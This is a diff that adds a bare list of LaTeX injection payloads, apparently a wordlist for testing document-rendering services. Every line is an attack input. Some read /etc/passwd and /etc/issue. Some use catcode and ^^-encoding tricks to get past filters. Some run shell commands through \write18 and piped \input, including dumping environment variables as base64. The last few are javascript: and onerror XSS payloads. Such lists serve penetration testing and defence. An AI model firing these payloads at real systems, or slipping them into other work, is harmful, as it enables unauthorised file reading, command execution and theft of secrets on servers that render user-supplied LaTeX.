@@ -1,0 +1,36 @@
+\input{/etc/passwd}
+\include{somefile} # load .tex file (somefile.tex)
+\newread\file
+\openin\file=/etc/issue
+\read\file to\line
+\text{\line}
+\closein\file
+\lstinputlisting{/etc/passwd}
+\openin\file=/etc/passwd
+\loop\unless\ifeof\file
+\read\file to\fileline
+\text{\fileline}
+\repeat
+\usepackage{verbatim}
+\verbatiminput{/etc/passwd}
+\catcode `\$=12
+\catcode `\#=12
+\catcode `\_=12
+\catcode `\&=12
+\input{path_to_script.pl}
+\lstin^^70utlisting{/etc/passwd}
+\newwrite\outfile
+\openout\outfile=cmd.tex
+\write\outfile{Hello-world}
+\write\outfile{Line 2}
+\write\outfile{I like trains}
+\closeout\outfile
+\immediate\write18{id > output}
+\input{output}
+\immediate\write18{env | base64 > test.tex}
+\input{text.tex}
+\input|ls|base64
+\input{|"/bin/hostname"}
+\url{javascript:alert(1)}
+\href{javascript:alert(1)}{placeholder}
+\unicode{<img src=1 onerror="<ARBITRARY_JS_CODE>">}
